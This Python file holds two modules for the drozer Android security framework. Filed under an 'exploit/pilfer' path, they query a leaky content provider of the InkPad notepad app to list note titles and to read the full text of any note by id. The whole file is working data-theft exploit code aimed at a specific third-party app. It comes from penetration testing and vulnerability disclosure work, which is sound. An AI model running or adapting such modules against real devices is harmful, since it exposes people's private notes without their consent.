from drozer.modules import common, Module

class List(Module, common.TableFormatter, common.Provider):
    
    name = "Lists notes created with the InkPad application"
    description = """Lists notes created with the InkPad application (com.workpail.inkpad.notepad.notes), and are exposed through a leaky content provider."""
    examples = ""
    author = "Henry Hoggard"
    date = "2012-12-17"
    license = "BSD (3 clause)"
    path = ["exploit", "pilfer", "thirdparty", "inkpad", "notes"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]
    
    __provider = "content://com.workpail.inkpad.provider.NotePad/notes"
    
    def execute(self, arguments):
        cursor = self.contentResolver().query(self.__provider, ["_id", "title"])
        
        if cursor != None:
            self.print_table(self.getResultSet(cursor))
        else:
            self.stderr.write("Could not query the InkPad content provider.\n\n")
            
            
class Note(Module, common.Provider, common.TableFormatter):
    
    name = "Reads notes created with the InkPad application."
    description = """Reads notes created with the InkPad application (com.workpail.inkpad.notepad.notes), and are exposed through a leaky content provider."""
    examples = ""
    author = "Henry Hoggard"
    date = "2012-12-17"
    license = "BSD (3 clause)"
    path = ["exploit", "pilfer", "thirdparty", "inkpad", "notes"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]
    
    __provider = "content://com.workpail.inkpad.provider.NotePad/notes"
    
    def add_arguments(self, parser):
        parser.add_argument("id", help="the _id of the note to read", nargs="?")
    
    def execute(self, arguments):
        cursor = self.contentResolver().query(self.__provider, ["title", "note"], "_id=?", [arguments.id])
        
        self.print_table(self.getResultSet(cursor), vertical=True)
        